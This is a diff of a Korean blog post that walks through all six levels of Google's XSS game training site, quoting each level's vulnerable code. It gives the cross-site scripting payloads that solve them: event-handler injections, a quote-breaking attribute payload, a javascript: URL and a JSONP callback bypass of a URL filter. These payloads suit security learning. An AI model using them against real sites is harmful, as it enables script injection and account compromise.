@@ -295,9 +295,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post dock' style="display: none;">
+        <div id="full" class='cover-wrapper post focus' style="display: none;">
           
-            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg"></div>
+            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
           <div class='cover-body'>
   <div class='top'>
@@ -347,7 +347,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
 <div class='new-meta-item author'>
   <a class='author' href="/" rel="nofollow">
-    <img no-lazy src="">
+    <img no-lazy src="/img/header/cat.jpeg">
     <p>jhyeon</p>
   </a>
 </div>
@@ -370,7 +370,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>Apr 22, 2020</p>
+    <p>Date : Apr 22, 2020</p>
   </a>
 </div>
 
@@ -378,6 +378,17 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
             
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="xss game Write up" data-path="/2020/04/22/xssgame-200422/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        View
+      </div>
+    </a>
+  </div>
+
 
           
         
@@ -389,131 +400,33 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   
   <p>홈페이지 : <a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p>
-<h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><pre><code class="html">&lt;svg onload=alert(1)&gt;</code></pre>
+<h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><pre><code class="html">&lt;img src=&quot;#&quot; onerror=alert(1)&gt;</code></pre>
+<h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <p>onerror 이벤트 핸들러로 alert를 띄워줄 수 있다.</p>
 <hr>
-<h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><pre><code class="js">    &lt;script&gt;
-      function chooseTab(num) &#123;
-        // Dynamically load the appropriate image.
-        var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;;
-        html += &quot;&lt;img src=&#39;/static/level3/cloud&quot; + num + &quot;.jpg&#39; /&gt;&quot;;
-        $(&#39;#tabContent&#39;).html(html);
-
-        window.location.hash = num;
-
-        // Select the current tab
-        var tabs = document.querySelectorAll(&#39;.tab&#39;);
-        for (var i = 0; i &lt; tabs.length; i++) &#123;
-          if (tabs[i].id == &quot;tab&quot; + parseInt(num)) &#123;
-            tabs[i].className = &quot;tab active&quot;;
-            &#125; else &#123;
-            tabs[i].className = &quot;tab&quot;;
-          &#125;
-        &#125;
-
-        // Tell parent we&#39;ve changed the tab
-        top.postMessage(self.location.toString(), &quot;*&quot;);
-      &#125;
-
-      window.onload = function() &#123; 
-        chooseTab(unescape(self.location.hash.substr(1)) || &quot;1&quot;);
-      &#125;
-
-      // Extra code so that we can communicate with the parent page
-      window.addEventListener(&quot;message&quot;, function(event)&#123;
-        if (event.source == parent) &#123;
-          chooseTab(unescape(self.location.hash.substr(1)));
-        &#125;
-      &#125;, false);
-    &lt;/script&gt;
-&lt;img src=&#39;/static/level3/cloud&quot; + num + &quot;.jpg&#39; /&gt;</code></pre>
+<h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js">    &lt;script&gt;<br>      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">chooseTab</span>(<span class="hljs-params">num</span>) </span>&#123;<br>        <span class="hljs-comment">// Dynamically load the appropriate image.</span><br>        <span class="hljs-keyword">var</span> html = <span class="hljs-string">&quot;Image &quot;</span> + <span class="hljs-built_in">parseInt</span>(num) + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        html += <span class="hljs-string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="hljs-string">&quot;.jpg&#x27; /&gt;&quot;</span>;<br>        $(<span class="hljs-string">&#x27;#tabContent&#x27;</span>).html(html);<br><br>        <span class="hljs-built_in">window</span>.location.hash = num;<br><br>        <span class="hljs-comment">// Select the current tab</span><br>        <span class="hljs-keyword">var</span> tabs = <span class="hljs-built_in">document</span>.querySelectorAll(<span class="hljs-string">&#x27;.tab&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; tabs.length; i++) &#123;<br>          <span class="hljs-keyword">if</span> (tabs[i].id == <span class="hljs-string">&quot;tab&quot;</span> + <span class="hljs-built_in">parseInt</span>(num)) &#123;<br>            tabs[i].className = <span class="hljs-string">&quot;tab active&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>            tabs[i].className = <span class="hljs-string">&quot;tab&quot;</span>;<br>          &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// Tell parent we&#x27;ve changed the tab</span><br>        top.postMessage(self.location.toString(), <span class="hljs-string">&quot;*&quot;</span>);<br>      &#125;<br><br>      <span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; <br>        chooseTab(<span class="hljs-built_in">unescape</span>(self.location.hash.substr(<span class="hljs-number">1</span>)) || <span class="hljs-string">&quot;1&quot;</span>);<br>      &#125;<br><br>      <span class="hljs-comment">// Extra code so that we can communicate with the parent page</span><br>      <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (event.source == parent) &#123;<br>          chooseTab(<span class="hljs-built_in">unescape</span>(self.location.hash.substr(<span class="hljs-number">1</span>)));<br>        &#125;<br>      &#125;, <span class="hljs-literal">false</span>);<br>    &lt;/script&gt;<br>&lt;img src=<span class="hljs-string">&#x27;/static/level3/cloud&quot; + num + &quot;.jpg&#x27;</span> /&gt;<br></code></pre></td></tr></table></figure>
 <p>chooseTab 함수가 호출될 때, 위와 같이 img 태그를 사용하고 있다.</p>
 <p>여기서 onerror event handler 사용할려면 #framenum.jpg’ onerror=~ 와 같이 페이로드를 완성해주면 된다.</p>
-<pre><code class="html">frame#4.jpg&#39; onerror=alert(1)&gt;</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">frame#4.jpg&#x27; onerror=alert(1)&gt;<br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><pre><code class="js">    &lt;script&gt;
-      function startTimer(seconds) &#123;
-        seconds = parseInt(seconds) || 3;
-        setTimeout(function() &#123; 
-          window.confirm(&quot;Time is up!&quot;);
-          window.history.back();
-        &#125;, seconds * 1000);
-      &#125;
-    &lt;/script&gt;
-&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#123;&#123; timer &#125;&#125;&#39;);&quot; /&gt;</code></pre>
+<h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">    &lt;script&gt;<br>      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">startTimer</span>(<span class="hljs-params">seconds</span>) </span>&#123;<br>        seconds = <span class="hljs-built_in">parseInt</span>(seconds) || <span class="hljs-number">3</span>;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; <br>          <span class="hljs-built_in">window</span>.confirm(<span class="hljs-string">&quot;Time is up!&quot;</span>);<br>          <span class="hljs-built_in">window</span>.history.back();<br>        &#125;, seconds * <span class="hljs-number">1000</span>);<br>      &#125;<br>    &lt;/script&gt;<br>&lt;img src=<span class="hljs-string">&quot;/static/loading.gif&quot;</span> onload=<span class="hljs-string">&quot;startTimer(&#x27;&#123;&#123; timer &#125;&#125;&#x27;);&quot;</span> /&gt;<br></code></pre></td></tr></table></figure>
 <p>타이머 호출 스크립트이다, 그냥 입력한 숫자만큼 타이머가 돌아가는 구조라서 딱히 건드릴 부분은 없다.</p>
 <p>하지만, 위 부분을 보면 onload event handler 로 스크립트를 실행하고 있다.</p>
 <p>즉, onload 부분을 이용해서 alert를 띄워주면 된다.</p>
-<pre><code class="html">timer=1&#39;);alert(&#39;1</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">timer=1&#x27;);alert(&#x27;1<br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><pre><code class="html">&lt;body id=&quot;level5&quot;&gt;
-  Welcome! Today we are announcing the much anticipated&lt;br&gt;&lt;br&gt;
-  &lt;img src=&quot;/static/logos/level5.png&quot; /&gt;&lt;br&gt;&lt;br&gt;
-
-  &lt;a href=&quot;/level5/frame/signup?next=confirm&quot;&gt;Sign up&lt;/a&gt; 
-  for an exclusive Beta.
-&lt;/body&gt;</code></pre>
+<h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;level5&quot;</span>&gt;</span><br>  Welcome! Today we are announcing the much anticipated<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/logos/level5.png&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/level5/frame/signup?next=confirm&quot;</span>&gt;</span>Sign up<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <br>  for an exclusive Beta.<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <p>welcome.html 에서 sign up 페이지로 넘어가는 과정을 보면 ?next= 파라미터에 confirm 값을 담아서 a 태그로 페이지를 넘긴다.</p>
 <p>여기서 보면 get 방식으로 값이 넘어오기 때문에 next= 에 대한 값을 바꿀 수 있게 된다.</p>
 <p>즉, href 속성 값의 next= 파라미터의 값을 통해 alert 팝업을 실행해야 하는데, a 태그에서의 javascript 실행은 다음과 같이 구성된다.</p>
 <p>javascript:alert(1)</p>
 <p>그래서 next=javascript:alert(1) 를 입력해주면 next 버튼을 클릭했을 때 자바스크립트 팝업창이 실행된다.</p>
 <hr>
-<h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><pre><code class="js">&lt;script&gt;
-function setInnerText(element, value) &#123;
-  if (element.innerText) &#123;
-    element.innerText = value;
-  &#125; else &#123;
-    element.textContent = value;
-  &#125;
-&#125;
-
-function includeGadget(url) &#123;
-  var scriptEl = document.createElement(&#39;script&#39;);
-
-  // This will totally prevent us from loading evil URLs!
-  if (url.match(/^https?:\/\//)) &#123;
-    setInnerText(document.getElementById(&quot;log&quot;),
-      &quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;);
-    return;
-  &#125;
-
-  // Load this awesome gadget
-  scriptEl.src = url;
-
-  // Show log messages
-  scriptEl.onload = function() &#123; 
-    setInnerText(document.getElementById(&quot;log&quot;),  
-      &quot;Loaded gadget from &quot; + url);
-  &#125;
-  scriptEl.onerror = function() &#123; 
-    setInnerText(document.getElementById(&quot;log&quot;),  
-      &quot;Couldn&#39;t load gadget from &quot; + url);
-  &#125;
-
-  document.head.appendChild(scriptEl);
-&#125;
-
-// Take the value after # and use it as the gadget filename.
-function getGadgetName() &#123; 
-  return window.location.hash.substr(1) || &quot;/static/gadget.js&quot;;
-&#125;
-
-includeGadget(getGadgetName());
-
-// Extra code so that we can communicate with the parent page
-window.addEventListener(&quot;message&quot;, function(event)&#123;
-  if (event.source == parent) &#123;
-    includeGadget(getGadgetName());
-  &#125;
-&#125;, false);
-
-&lt;/script&gt;</code></pre>
+<h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setInnerText</span>(<span class="hljs-params">element, value</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (element.innerText) &#123;<br>    element.innerText = value;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    element.textContent = value;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">includeGadget</span>(<span class="hljs-params">url</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> scriptEl = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;script&#x27;</span>);<br><br>  <span class="hljs-comment">// This will totally prevent us from loading evil URLs!</span><br>  <span class="hljs-keyword">if</span> (url.match(<span class="hljs-regexp">/^https?:\/\//</span>)) &#123;<br>    setInnerText(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;log&quot;</span>),<br>      <span class="hljs-string">&quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Load this awesome gadget</span><br>  scriptEl.src = url;<br><br>  <span class="hljs-comment">// Show log messages</span><br>  scriptEl.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; <br>    setInnerText(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;log&quot;</span>),  <br>      <span class="hljs-string">&quot;Loaded gadget from &quot;</span> + url);<br>  &#125;<br>  scriptEl.onerror = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; <br>    setInnerText(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;log&quot;</span>),  <br>      <span class="hljs-string">&quot;Couldn&#x27;t load gadget from &quot;</span> + url);<br>  &#125;<br><br>  <span class="hljs-built_in">document</span>.head.appendChild(scriptEl);<br>&#125;<br><br><span class="hljs-comment">// Take the value after # and use it as the gadget filename.</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getGadgetName</span>(<span class="hljs-params"></span>) </span>&#123; <br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">window</span>.location.hash.substr(<span class="hljs-number">1</span>) || <span class="hljs-string">&quot;/static/gadget.js&quot;</span>;<br>&#125;<br><br>includeGadget(getGadgetName());<br><br><span class="hljs-comment">// Extra code so that we can communicate with the parent page</span><br><span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>)</span>&#123;<br>  <span class="hljs-keyword">if</span> (event.source == parent) &#123;<br>    includeGadget(getGadgetName());<br>  &#125;<br>&#125;, <span class="hljs-literal">false</span>);<br><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 <p>마지막 문제이다, 전체적인 코드가 좀 긴데 보면은 url.match 로 https 값이 있는지 검증해서 필터링한다.</p>
 <p>그렇다고 http를 넣어서 하면은 http를 포함할 수 없다고 오류 메세지를 친절하게 반환해준다.</p>
-<pre><code class="js">&lt;script src=&quot;값&quot;&gt;&lt;/script&gt;</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;값&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 <p>위 조건을 통과하고 나면 script를 호출하게 되는데 위와 같이 실행된다.</p>
 <p>문제의 의도대로 풀려면 힌트에서 주어지는 google api 를 통해서 보면 되는데, https ://google.com/jsapi?callback=foo 여기서 함수 호출 과정을 보니 callback 파리미터로 넘어온 변수를 실행시켜주고 있다.</p>
 <p>그렇기에 callback 파라미터로 alert를 날려주면 alert(); 이 실행될 것 이다.</p>
@@ -532,7 +445,7 @@ window.addEventListener(&quot;message&quot;, function(event)&#123;
       <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
     </section>
     <section class='body'>
-      <div class="vlts-rps"><a class="item" href="/2020/05/26/browser-auditor-200526/" title="Browser Auditor 기술 발표 자료" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">Browser Auditor 기술 발표 자료</span></a><a class="item" href="/2020/02/05/xsscheatsheet-200205/" title="xss cheatsheet 2020" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">xss cheatsheet 2020</span></a><a class="item" href="/2020/05/15/function-rce-200515/" title="create_function() RCE 취약점 정리" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">create_function() RCE 취약점 정리</span></a></div></section></div>
+      <div class="vlts-rps"><a class="item" href="/2020/05/26/browser-auditor-200526/" title="Browser Auditor 기술 발표 자료" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">Browser Auditor 기술 발표 자료</span></a><a class="item" href="/2020/02/05/xsscheatsheet-200205/" title="xss cheatsheet 2020" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">xss cheatsheet 2020</span></a><a class="item" href="/2020/04/22/jwtinjection-200422/" title="JWT None Type Injection" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">JWT None Type Injection</span></a></div></section></div>
       
       
       
@@ -546,10 +459,10 @@ window.addEventListener(&quot;message&quot;, function(event)&#123;
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-22T00:00:00+09:00">
+          <div class="new-meta-item date">
   <a class='notlink'>
-    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>EditApr 22, 2020</p>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>Date : Apr 22, 2020</p>
   </a>
 </div>
 
@@ -584,8 +497,7 @@ Notion : https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b546
       
         <a class='next' href='/2020/04/10/angstormctf-200410/'>
           <p class='title'>angstorm ctf 2020 Write up<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>1. [WEB - The Magic Word]&lt;script&gt;
-    var msg = document.getElementById(&quot;magic&quot;);...</p>
+          <p class='content'>1. [WEB - The Magic Word]12345678910&lt;script&gt;    var msg = document.getElementById(&quot;mag...</p>
         </a>
       
     </div>
@@ -630,7 +542,7 @@ Notion : https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b546
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LEVEL-1"><span class="toc-text">1. LEVEL-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LEVEL-2"><span class="toc-text">2. LEVEL-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-LEVEL-3"><span class="toc-text">3. LEVEL-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-LEVEL-4"><span class="toc-text">4. LEVEL-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LEVEL-5"><span class="toc-text">5. LEVEL-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-LEVEL-6"><span class="toc-text">6. LEVEL-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ALL-CLEAR"><span class="toc-text">ALL CLEAR</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LEVEL-1"><span class="toc-number">1.</span> <span class="toc-text">1. LEVEL-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LEVEL-2"><span class="toc-number">2.</span> <span class="toc-text">2. LEVEL-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-LEVEL-3"><span class="toc-number">3.</span> <span class="toc-text">3. LEVEL-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-LEVEL-4"><span class="toc-number">4.</span> <span class="toc-text">4. LEVEL-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LEVEL-5"><span class="toc-number">5.</span> <span class="toc-text">5. LEVEL-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-LEVEL-6"><span class="toc-number">6.</span> <span class="toc-text">6. LEVEL-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ALL-CLEAR"><span class="toc-number">7.</span> <span class="toc-text">ALL CLEAR</span></a></li></ol>
     </div>
   </section>
 
@@ -800,7 +712,7 @@ var loadCSS = function( href, before, media, attributes ){
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
   
-  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/atelier-cave-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1193,6 +1105,215 @@ volantis.pjax.push(()=>{
 
 
 
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'u9j57bwJod4EDmXWdxrwuqQT-MdYXbMMI',
+    app_key: 'jfHtEKVE24j0IVCGHbvuFClp',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://blog.jhyeon.dev' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
